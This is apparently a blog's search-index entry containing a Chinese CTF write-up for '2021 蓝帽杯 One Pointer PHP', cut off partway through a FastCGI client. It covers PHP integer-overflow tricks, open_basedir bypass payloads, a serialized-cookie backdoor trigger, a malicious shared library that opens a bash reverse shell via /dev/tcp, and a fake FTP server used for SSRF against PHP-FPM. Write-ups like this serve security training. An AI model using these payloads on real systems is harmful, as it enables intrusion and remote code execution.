<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2021 蓝帽杯 One Pointer PHP</title>
    <url>/2022/08/31/2021_%E8%93%9D%E5%B8%BD%E6%9D%AFOne%20Pointer%20PHP/</url>
    <content><![CDATA[<h1 id="2021-蓝帽杯-One-Pointer-PHP"><a href="#2021-蓝帽杯-One-Pointer-PHP" class="headerlink" title="[2021 蓝帽杯] One Pointer PHP"></a>[2021 蓝帽杯] One Pointer PHP</h1><h2 id="前置知识："><a href="#前置知识：" class="headerlink" title="前置知识："></a>前置知识：</h2><h3 id="1-php数组溢出"><a href="#1-php数组溢出" class="headerlink" title="1.php数组溢出"></a>1.php数组溢出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">32位系统 最大整数  =&gt; 231 =&gt; 2,147,483,648 - 1 =&gt; 2,147,483,647</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">64位系统 最大整数  =&gt; 263 =&gt; 9,223,372,036,854,775,808 - 1  =&gt; 9,223,372,036,854,775,807</span><br></pre></td></tr></table></figure>

<p>如果超出整型范围则解析为浮点型。 </p>
<h3 id="2-a-的赋值特性"><a href="#2-a-的赋值特性" class="headerlink" title="2.$a[]的赋值特性"></a>2.$a[]的赋值特性</h3><p><img src="/../images/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(1).png" alt="image.png"><br>如果我们赋值给<code>$a[100]=2</code>,则<code>$a[]=3;</code>默认为<code>$a[101]=3</code><br>即赋值给下一个索引值。</p>
<h4 id="示例1"><a href="#示例1" class="headerlink" title="#示例1"></a>#示例1</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$count[]=100000000000000000000000;   // 只要大于9,223,372,036,854,775,807就能返回`yes`</span><br><span class="line">if($count[]=1)</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;yes&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 输出yes</span><br></pre></td></tr></table></figure>
<span id="more"></span>
<h3 id="3-Bypass-open-basedir"><a href="#3-Bypass-open-basedir" class="headerlink" title="3.Bypass open_basedir"></a>3.Bypass open_basedir</h3><h4 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h4><p>open_basedir是php.ini的一个配置选项，可以将用户的目录活动范围锁在范围之内。<br>如：活动范围是：<br><img src="/../images/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(2).png" alt="image.png"><br>则<code>/var/www/html/test可访问</code><br>且<code>/var/www不可访问</code><br>即 限制范围的衍生出来的目录可以访问，以内不能访问</p>
<h4 id="方法一：命令执行函数绕过"><a href="#方法一：命令执行函数绕过" class="headerlink" title="方法一：命令执行函数绕过"></a>方法一：命令执行函数绕过</h4><p>新建3.php文件：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;php://filter/read=convert.base64-encode/resource=../index.php&quot;</span>);</span><br></pre></td></tr></table></figure>
<p><img src="/../images/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(3).png" alt="image.png"><br>成功读取文件</p>
<p>设置了open_basedir后：<br><img src="/../images/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(4).png" alt="image.png"><br>禁止读取文件了，如果用system函数读取呢</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//include(&quot;php://filter/read=convert.base64-encode/resource=../index.php&quot;);</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;type ..\index.php&quot;</span>);</span><br></pre></td></tr></table></figure>
<p><img src="/../images/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(5).png" alt="image.png"></p>
<h4 id="方法二-glob协议"><a href="#方法二-glob协议" class="headerlink" title="方法二.glob协议"></a>方法二.glob协议</h4><p>用这个代码，访问该文件就可以得到根目录的内容</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;glob:///*&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$b</span> = <span class="title function_ invoke__">opendir</span>(<span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">while</span>((<span class="variable">$file</span> = <span class="title function_ invoke__">readdir</span>(<span class="variable">$b</span>)) !== <span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$file</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;<span class="comment">//将根目录的文件名字输出</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">closedir</span>(<span class="variable">$b</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/../images/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(6).png" alt="image.png"></p>
<h4 id="方法三-利用ini-set读取文件内容"><a href="#方法三-利用ini-set读取文件内容" class="headerlink" title="方法三.利用ini_set读取文件内容"></a>方法三.利用ini_set读取文件内容</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">mkdir</span>(<span class="string">&#x27;TES&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;TES&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>);  <span class="comment">//一定要有这个var_dump，否则是没有回显的</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>成功访问</p>
<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a><img src="/../images/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(7).png" alt="image.png">解题</h2><p>题目给了源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$count</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;user.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;data&quot;</span>]))&#123;</span><br><span class="line">	<span class="variable">$count</span>[++<span class="variable">$user</span>-&gt;count]=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$count</span>[]=<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="variable">$user</span>-&gt;count+=<span class="number">1</span>;</span><br><span class="line">		<span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;data&quot;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>));</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&quot;backdoor&quot;</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$user</span>=<span class="keyword">new</span> <span class="title class_">User</span>;</span><br><span class="line">	<span class="variable">$user</span>-&gt;count=<span class="number">1</span>;</span><br><span class="line">	<span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;data&quot;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="溢出绕过"><a href="#溢出绕过" class="headerlink" title="溢出绕过"></a>溢出绕过</h3><p>这里要求<code>$count[]=1为假</code><br>即<code>$count[++$user-&gt;count]</code>中的<code>++$user-&gt;count</code>&#x3D;9,223,372,036,854,775,807</p>
<p>这样子就可以使得$count[]&#x3D;1的序列号为<code>9,223,372,036,854,775,808</code>，溢出了整数最大值，便可以为假<br>成功执行eval一句话木马，试一下phpinfo()<br><img src="/../images/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(8).png" alt="image.png"><br>可以看到phpinfo()；成功执行了<br>注意到phpinfo里面有disable_function<br><img src="/../images/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(9).png" alt="image.png"><br>还有限制目录<br><img src="/../images/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(2).png" alt="image.png"><br>这里有几个方法 可以绕过，我就说两三个：</p>
<h3 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h3><h4 id="1-ini-set-的方法"><a href="#1-ini-set-的方法" class="headerlink" title="1.ini_set 的方法"></a>1.ini_set 的方法</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?backdoor=<span class="title function_ invoke__">mkdir</span>(<span class="string">&#x27;qf&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;qf&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;/&#x27;</span>));</span><br></pre></td></tr></table></figure>
<p>这段话的简单过程如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir -&gt; 创建新的目录</span><br><span class="line">chdir -&gt; 进入目录</span><br><span class="line">ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;) -&gt; 设置..为可用的路径</span><br><span class="line">chdir(..） -&gt; 上一级</span><br><span class="line">ini_set(&#x27;open_basedir&#x27;,&#x27;/&#x27;) -&gt; 设置/为可用的路径</span><br><span class="line">scandir  -&gt;  列出指定目录的文件，返回的是array</span><br><span class="line">print_r()  -&gt; 打印</span><br></pre></td></tr></table></figure>
<p><img src="/../images/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(10).png" alt="image.png"></p>
<h4 id="2-连接蚁剑，上传文件"><a href="#2-连接蚁剑，上传文件" class="headerlink" title="2.连接蚁剑，上传文件"></a>2.连接蚁剑，上传文件</h4><p>连接的地址是<code>/add_api.php?backdoor=eval($_POST[8]);</code><br>记得添加请求信息的Cookie，值为<code>data=O%3A4%3A%22User%22%3A1%3A%7Bs%3A5%3A%22count%22%3Bi%3A9223372036854775806%3B%7D</code><br><img src="/../images/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(11).png" alt="image.png"><br>连接成功<br>上传文件a.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;glob:///*&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$b</span> = <span class="title function_ invoke__">opendir</span>(<span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">while</span>((<span class="variable">$file</span> = <span class="title function_ invoke__">readdir</span>(<span class="variable">$b</span>)) !== <span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$file</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;<span class="comment">//将根目录的文件名字输出</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">closedir</span>(<span class="variable">$b</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上传成功后，访问即可以得到根目录：<br><img src="/../images/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(12).png" alt="image.png"></p>
<h4 id="3-利用DirectoryIterator的globa"><a href="#3-利用DirectoryIterator的globa" class="headerlink" title="3.利用DirectoryIterator的globa"></a>3.利用DirectoryIterator的globa</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>直接复制贴在backdoor后面:<br><img src="/../images/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(13).png" alt="image.png"></p>
<hr>
<p>开始下一步解题</p>
<h3 id="分析配置文件"><a href="#分析配置文件" class="headerlink" title="分析配置文件"></a>分析配置文件</h3><p>尝试读取flag：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?backdoor=<span class="title function_ invoke__">mkdir</span>(%<span class="number">27</span>qf%<span class="number">27</span>);<span class="title function_ invoke__">chdir</span>(%<span class="number">27</span>qf%<span class="number">27</span>);<span class="title function_ invoke__">ini_set</span>(%<span class="number">27</span>open_basedir%<span class="number">27</span>,%<span class="number">27</span>..%<span class="number">27</span>);<span class="title function_ invoke__">chdir</span>(%<span class="number">27</span>..%<span class="number">27</span>);<span class="title function_ invoke__">chdir</span>(%<span class="number">27</span>..%<span class="number">27</span>);<span class="title function_ invoke__">chdir</span>(%<span class="number">27</span>..%<span class="number">27</span>);<span class="title function_ invoke__">chdir</span>(%<span class="number">27</span>..%<span class="number">27</span>);<span class="title function_ invoke__">ini_set</span>(%<span class="number">27</span>open_basedir%<span class="number">27</span>,%<span class="number">27</span>/%<span class="number">27</span>);<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(%<span class="number">27</span>/%<span class="number">27</span>));<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(%<span class="number">27</span>/flag%<span class="number">27</span>));</span><br></pre></td></tr></table></figure>
<p><img src="/../images/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(14).png" alt="image.png"><br>返回了False</p>
<p>看一下本地进程<br><img src="/../images/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(15).png" alt="image.png"></p>
<p>再看一下fpm的运行端口：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?backdoor=<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;qf&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);<span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/etc/nginx/sites-available/default&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>返回 ：<br><img src="/../images/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(16).png" alt="image.png"><br>发现在9001端口<br><code>fastcgi_pass 127.0.0.1:9001;</code>只接受本地的包，如果要利用FastCgi需要利用SSRF</p>
<h3 id="FPM未授权攻击"><a href="#FPM未授权攻击" class="headerlink" title="FPM未授权攻击"></a>FPM未授权攻击</h3><h4 id="1-构造恶意的so文件"><a href="#1-构造恶意的so文件" class="headerlink" title="1.构造恶意的so文件"></a>1.构造恶意的so文件</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#define _GNU_SOURCE</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="title function_ invoke__">__attribute__</span> ((__constructor__)) <span class="keyword">void</span> <span class="title function_ invoke__">preload</span> (<span class="keyword">void</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/ip/2333 0&gt;&amp;1&#x27;&quot;</span>);  <span class="comment">//记住这个监听端口，要与下面的保持一致</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//gcc payload.c -fPIC -shared -o payload.so</span></span><br></pre></td></tr></table></figure>
<p>这个payload.so的名字也要和<code>php脚本</code>对应</p>
<h4 id="2-构造SSRF"><a href="#2-构造SSRF" class="headerlink" title="2.构造SSRF"></a>2.构造SSRF</h4><p>构造一个文件，file.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] ?? <span class="string">&#x27;/tmp/file&#x27;</span>;</span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>] ?? <span class="string">&#x27;:)&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$file</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>.<span class="variable">$data</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="variable">$data</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里的<code>$file = $_GET[&#39;file&#39;] ?? &#39;/tmp/file&#39;;</code><br>??是php的新语言，如果 $_GET[‘file’] 存在，则取 $_GET[‘file’] 的值，若不存在，则取 &#x2F;tmp&#x2F;file<br><code>类似 isset($a)? $a:$b;</code></p>
<h4 id="3-构造FTP服务器"><a href="#3-构造FTP服务器" class="headerlink" title="3.构造FTP服务器"></a>3.构造FTP服务器</h4><p>都说了是FTP服务器，肯定是得能访问，所以这个要在公网上运行这个脚本（python）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import socket</span><br><span class="line">s = socket.<span class="title function_ invoke__">socket</span>(socket.AF_INET, socket.SOCK_STREAM) </span><br><span class="line">s.<span class="title function_ invoke__">bind</span>((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">9999</span>))<span class="comment">#这里是ftp的端口</span></span><br><span class="line">s.<span class="title function_ invoke__">listen</span>(<span class="number">1</span>)</span><br><span class="line">conn, addr = s.<span class="title function_ invoke__">accept</span>()</span><br><span class="line">conn.<span class="title function_ invoke__">send</span>(b<span class="string">&#x27;220 welcome\n&#x27;</span>)</span><br><span class="line"><span class="comment">#Service ready for new user.</span></span><br><span class="line"><span class="comment">#Client send anonymous username</span></span><br><span class="line"><span class="comment">#USER anonymous</span></span><br><span class="line">conn.<span class="title function_ invoke__">send</span>(b<span class="string">&#x27;331 Please specify the password.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#User name okay, need password.</span></span><br><span class="line"><span class="comment">#Client send anonymous password.</span></span><br><span class="line"><span class="comment">#PASS anonymous</span></span><br><span class="line">conn.<span class="title function_ invoke__">send</span>(b<span class="string">&#x27;230 Login successful.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#User logged in, proceed. Logged out if appropriate.</span></span><br><span class="line"><span class="comment">#TYPE I</span></span><br><span class="line">conn.<span class="title function_ invoke__">send</span>(b<span class="string">&#x27;200 Switching to Binary mode.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#Size /</span></span><br><span class="line">conn.<span class="title function_ invoke__">send</span>(b<span class="string">&#x27;550 Could not get the file size.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#EPSV (1)</span></span><br><span class="line">conn.<span class="title function_ invoke__">send</span>(b<span class="string">&#x27;150 ok\n&#x27;</span>)</span><br><span class="line"><span class="comment">#PASV</span></span><br><span class="line">conn.<span class="title function_ invoke__">send</span>(b<span class="string">&#x27;227 Entering Extended Passive Mode (127,0,0,1,0,9001)\n&#x27;</span>) <span class="comment">#STOR / (2)  </span></span><br><span class="line">                                                            <span class="comment">// 注意端口</span></span><br><span class="line">conn.<span class="title function_ invoke__">send</span>(b<span class="string">&#x27;150 Permission denied.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#QUIT</span></span><br><span class="line">conn.<span class="title function_ invoke__">send</span>(b<span class="string">&#x27;221 Goodbye.\n&#x27;</span>)</span><br><span class="line">conn.<span class="title function_ invoke__">close</span>()</span><br></pre></td></tr></table></figure>
<p>注意：只要连接到就会退出</p>
<h4 id="4-构造Fastcgi请求"><a href="#4-构造Fastcgi请求" class="headerlink" title="4.构造Fastcgi请求"></a>4.构造Fastcgi请求</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Note : Code is released under the GNU LGPL</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Please do not change the header of this file</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This library is free software; you can redistribute it and/or modify it under the terms of the GNU</span></span><br><span class="line"><span class="comment"> * Lesser General Public License as published by the Free Software Foundation; either version 2 of</span></span><br><span class="line"><span class="comment"> * the License, or (at your option) any later version.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;</span></span><br><span class="line"><span class="comment"> * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * See the GNU Lesser General Public License for more details.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Handles communication with a FastCGI application</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>      Pierrick Charron &lt;pierrick<span class="doctag">@webstart</span>.fr&gt;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span>     1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FCGIClient</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">VERSION_1</span>            = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">BEGIN_REQUEST</span>        = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">ABORT_REQUEST</span>        = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">END_REQUEST</span>          = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">PARAMS</span>               = <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">STDIN</span>                = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">STDOUT</span>               = <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">STDERR</span>               = <span class="number">7</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">DATA</span>                 = <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">GET_VALUES</span>           = <span class="number">9</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">GET_VALUES_RESULT</span>    = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">UNKNOWN_TYPE</span>         = <span class="number">11</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">MAXTYPE</span>              = <span class="built_in">self</span>::<span class="variable constant_">UNKNOWN_TYPE</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">RESPONDER</span>            = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">AUTHORIZER</span>           = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">FILTER</span>               = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">REQUEST_COMPLETE</span>     = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">CANT_MPX_CONN</span>        = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">OVERLOADED</span>           = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">UNKNOWN_ROLE</span>         = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">MAX_CONNS</span>            = <span class="string">&#x27;MAX_CONNS&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">MAX_REQS</span>             = <span class="string">&#x27;MAX_REQS&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">MPXS_CONNS</span>           = <span class="string">&#x27;MPXS_CONNS&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">HEADER_LEN</span>           = <span class="number">8</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Socket</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Resource</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_sock</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Host</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> String</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_host</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Port</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Integer</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_port</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Keep Alive</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Boolean</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_keepAlive</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Constructor</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $host Host of the FastCGI application</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Integer $port Port of the FastCGI application</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$host</span>, <span class="variable">$port</span> = <span class="number">9001</span></span>) // <span class="title">and</span> <span class="title">default</span> <span class="title">value</span> <span class="title">for</span> <span class="title">port</span>, <span class="title">just</span> <span class="title">for</span> <span class="title">unixdomain</span> <span class="title">socket</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_host = <span class="variable">$host</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_port = <span class="variable">$port</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Define whether or not the FastCGI application should keep the connection</span></span><br><span class="line"><span class="comment">     * alive at the end of a request</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Boolean $b true if the connection should stay alive, false otherwise</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setKeepAlive</span>(<span class="params"><span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable 